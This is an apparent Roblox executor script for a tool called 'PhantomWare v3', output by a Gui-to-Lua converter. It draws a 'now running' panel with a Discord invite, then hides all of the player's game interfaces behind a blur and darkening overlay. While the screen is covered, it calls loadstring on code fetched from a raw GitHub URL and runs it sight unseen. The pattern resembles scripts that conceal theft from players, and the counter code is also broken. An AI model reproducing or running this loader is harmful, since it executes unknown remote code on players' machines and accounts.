-- Gui to Lua
-- Version: 3.2

-- Instances:

local Phantom = Instance.new("ScreenGui")
local Container = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local ImageLabel = Instance.new("ImageLabel")
local ImageButton = Instance.new("ImageButton")
local UICorner_2 = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local DropShadowHolder = Instance.new("Frame")
local DropShadow = Instance.new("ImageLabel")
local Elapsed = Instance.new("TextLabel")
local Pfp = Instance.new("ImageLabel")

--Properties:

Phantom.Name = "Phantom"
Phantom.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Phantom.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Phantom.DisplayOrder = 999999999
Phantom.ResetOnSpawn = false

Container.Name = "Container"
Container.Parent = Phantom
Container.BackgroundColor3 = Color3.fromRGB(41, 43, 43)
Container.BorderSizePixel = 0
Container.ClipsDescendants = true
Container.Position = UDim2.new(0.393063575, 0, 0.303703576, 0)
Container.Size = UDim2.new(0, 333, 0, 318)
Container.Visible = false

UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = Container

ImageLabel.Parent = Container
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.44564566, 0, 0.160367832, 0)
ImageLabel.Size = UDim2.new(0, 36, 0, 36)
ImageLabel.Image = "rbxassetid://13735722089"

ImageButton.Parent = Container
ImageButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
ImageButton.BorderSizePixel = 0
ImageButton.Position = UDim2.new(0.138068676, 0, 0.713176012, 0)
ImageButton.Size = UDim2.new(0, 238, 0, 46)
ImageButton.ZIndex = 3453
ImageButton.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
ImageButton.ImageColor3 = Color3.fromRGB(88, 101, 242)
ImageButton.ImageTransparency = 1.000

UICorner_2.CornerRadius = UDim.new(0, 6)
UICorner_2.Parent = ImageButton

TextLabel.Parent = ImageButton
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0759999976, 0, 0.340000004, 0)
TextLabel.Size = UDim2.new(0, 200, 0, 15)
TextLabel.Font = Enum.Font.GothamBold
TextLabel.Text = "Join our Discord server"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

TextLabel_2.Parent = Container
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.201218486, 0, 0.339922965, 0)
TextLabel_2.Size = UDim2.new(0, 200, 0, 15)
TextLabel_2.Font = Enum.Font.GothamBold
TextLabel_2.Text = "PhantomWare v3"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

TextLabel_3.Parent = Container
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0.193000004, 0, 0.408006668, 0)
TextLabel_3.Size = UDim2.new(0, 200, 0, 11)
TextLabel_3.Font = Enum.Font.GothamMedium
TextLabel_3.Text = "is now running"
TextLabel_3.TextColor3 = Color3.fromRGB(112, 112, 112)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14.000
TextLabel_3.TextTransparency = 0.280
TextLabel_3.TextWrapped = true

DropShadowHolder.Name = "DropShadowHolder"
DropShadowHolder.Parent = Container
DropShadowHolder.BackgroundTransparency = 1.000
DropShadowHolder.BorderSizePixel = 0
DropShadowHolder.Size = UDim2.new(1, 0, 1, 0)
DropShadowHolder.ZIndex = 0

DropShadow.Name = "DropShadow"
DropShadow.Parent = DropShadowHolder
DropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
DropShadow.BackgroundTransparency = 1.000
DropShadow.BorderSizePixel = 0
DropShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
DropShadow.Size = UDim2.new(1, 47, 1, 47)
DropShadow.ZIndex = 0
DropShadow.Image = "rbxassetid://6014261993"
DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
DropShadow.ImageTransparency = 0.500
DropShadow.ScaleType = Enum.ScaleType.Slice
DropShadow.SliceCenter = Rect.new(49, 49, 450, 450)

Elapsed.Name = "Elapsed"
Elapsed.Parent = Container
Elapsed.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Elapsed.BackgroundTransparency = 1.000
Elapsed.BorderSizePixel = 0
Elapsed.Position = UDim2.new(0.199006006, 0, 0.521214247, 0)
Elapsed.Size = UDim2.new(0, 200, 0, 11)
Elapsed.Font = Enum.Font.GothamMedium
Elapsed.Text = "155"
Elapsed.TextColor3 = Color3.fromRGB(112, 112, 112)
Elapsed.TextScaled = true
Elapsed.TextSize = 14.000
Elapsed.TextTransparency = 0.280
Elapsed.TextWrapped = true

Pfp.Name = "Pfp"
Pfp.Parent = Container
Pfp.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Pfp.BackgroundTransparency = 1.000
Pfp.BorderSizePixel = 0
Pfp.Position = UDim2.new(0.708708704, 0, 0.581761003, 0)
Pfp.Size = UDim2.new(0, 146, 0, 146)
Pfp.Image = "rbxassetid://13735961008"
Pfp.ImageColor3 = Color3.fromRGB(145, 145, 145)
Pfp.ImageTransparency = 0.950

-- Scripts:

local function BWNHOHY_fake_script() -- Pfp.LocalScript 
	local script = Instance.new('LocalScript', Pfp)

	local Players = game:GetService("Players")
	
	local player = Players.LocalPlayer
	
	-- Fetch the thumbnail
	local userId = player.UserId
	local thumbType = Enum.ThumbnailType.AvatarBust
	local thumbSize = Enum.ThumbnailSize.Size100x100
	local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
	
	-- Set the ImageLabel's content to the user thumbnail
	local imageLabel = script.Parent
end
coroutine.wrap(BWNHOHY_fake_script)()
local function HTHPY_fake_script() -- Phantom.LocalScript 
	local script = Instance.new('LocalScript', Phantom)

	local container = script.Parent.Container
	local funny = Instance.new("UIStroke")
	funny.Parent = Container
	funny.Color = Color3.fromRGB(94, 94, 94)
	funny.Thickness = 1
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
	local Player = game.Players.LocalPlayer
local gui = Player:WaitForChild("PlayerGui")

for _, child in pairs(gui:GetChildren()) do
    if child:IsA('ScreenGui') then
        child.Enabled=false
    else
end

	-- container.Parent = game:GetService("CoreGui")
	local blur = Instance.new("BlurEffect")
	blur.Parent = game.Lighting
	blur.Size = 0 -- 18
	blur.Enabled = true
	local color = Instance.new("ColorCorrectionEffect")
	color.Parent = game.Lighting
	color.TintColor = Color3.fromRGB(0,0,0) -- Color3.fromRGB(67, 67, 67)
	color.Enabled=false
	local tween = game:GetService("TweenService")
	blur.Enabled=true
	color.Enabled=true
	tween:Create(blur, TweenInfo.new(2), {Size = 18}):Play()
	tween:Create(color, TweenInfo.new(2), {Brightness = -0.2}):Play()
	tween:Create(color, TweenInfo.new(2), {TintColor = Color3.fromRGB(67, 67, 67)}):Play()
	task.wait(2)
	container.Visible=true
	getgenv().FromTheGetGo = true
	loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/littlegui/main/WHAT-THE-FUCK'))()
	
	while task.wait(1) do
	    		print("PHANTOM ON TOP")
	    ny = Instance.new("NumberValue")
		val = ny.Value
		container.Elapsed.Text = val.." seconds elapsed"
		ny.Value= ny.Value + 1
	end
end
end
coroutine.wrap(HTHPY_fake_script)()
